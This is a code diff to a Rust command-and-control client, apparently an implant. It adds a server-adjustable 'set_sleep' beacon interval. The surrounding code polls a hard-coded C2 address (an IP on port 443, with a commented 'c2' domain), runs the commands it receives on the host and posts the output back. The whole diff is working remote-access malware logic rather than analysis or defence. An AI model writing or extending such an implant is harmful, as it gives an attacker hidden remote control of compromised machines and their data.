@@ -12,8 +12,9 @@ use std::io::Read;
 use dirs;
 use serde::{Deserialize, Serialize};
 use local_ip_address::local_ip;
+use std::sync::Mutex;
 
-const SLEEP_TIME: Duration = time::Duration::from_millis(5000);
+static SLEEP_TIME: Mutex<time::Duration> = Mutex::new(time::Duration::from_secs(5));
 // const SERVER_IP: &str = "https://c2.balls.agency:443";
 const SERVER_IP: &str = "https://129.21.21.74:443"; //backup IP in case the domain doesn't resolve - default for now
 
@@ -83,7 +84,7 @@ fn get_commands(identifier:&str) -> bool {
             ok.text().unwrap()
         }, Err(_)=>{
             print(&"Get_Commands - Can't connect to server");
-            thread::sleep(SLEEP_TIME);
+            sleep_client();
             return false
         }
     };
@@ -97,7 +98,7 @@ fn get_commands(identifier:&str) -> bool {
 
     if res.contains("502 Bad Gateway"){
         print("502 Bad Gateway");
-        thread::sleep(SLEEP_TIME);
+        sleep_client();
         return false
     }
     if res == "NONE" || res == "" {
@@ -134,7 +135,7 @@ fn get_command(cmd_id:&str) -> String{
             ok.text().unwrap()
         }, Err(_)=>{
             print(&"Get_Command - Can't connect to server");
-            thread::sleep(SLEEP_TIME);
+            sleep_client();
             return String::from("ERROR")
         }
     };
@@ -160,11 +161,17 @@ fn handle_command(cmd_id:&str, command:&str, identifier: &str){
             }
             let cmd_out = &run_command(&"pwd");
             post_response(&cmd_id, &cmd_out, &identifier);
+        } else if command.starts_with("set_sleep") {
+            let time = &command[10..].to_string().trim().parse::<u64>().unwrap();
+            let mut sleep_time = SLEEP_TIME.lock().unwrap();
+            *sleep_time = time::Duration::from_secs(*time); // Modify the value
+            post_response(&cmd_id, &format!("Sleep time set to: {}",time), &identifier);
         } else{
             let cmd_out = &run_command(&command);
             post_response(&cmd_id, &cmd_out, &identifier);
         }
-    }else{
+    // command will be in the format "set_sleep [time]"
+    } else {
         let cmd_out = &run_command(&command);
         post_response(&cmd_id, &cmd_out, &identifier);
     }
@@ -255,7 +262,7 @@ fn get_id(host_ip:&str) -> String {
                 id
             }, None=>{
                 print(&"Get_id - Can't connect to server");
-                thread::sleep(SLEEP_TIME);
+                sleep_client();
                 continue;
             }
         };
@@ -263,12 +270,17 @@ fn get_id(host_ip:&str) -> String {
     }
 }
 
+fn sleep_client(){
+    let sleep_time = SLEEP_TIME.lock().unwrap();
+    thread::sleep(*sleep_time);
+}
+
 fn main_loop(identifier:&str) -> Result<String,String>{
     loop{
         if !get_commands(&identifier) {
             return Err(String::from("Error"));
         }
-        thread::sleep(SLEEP_TIME);
+        sleep_client();
     }
 }
 
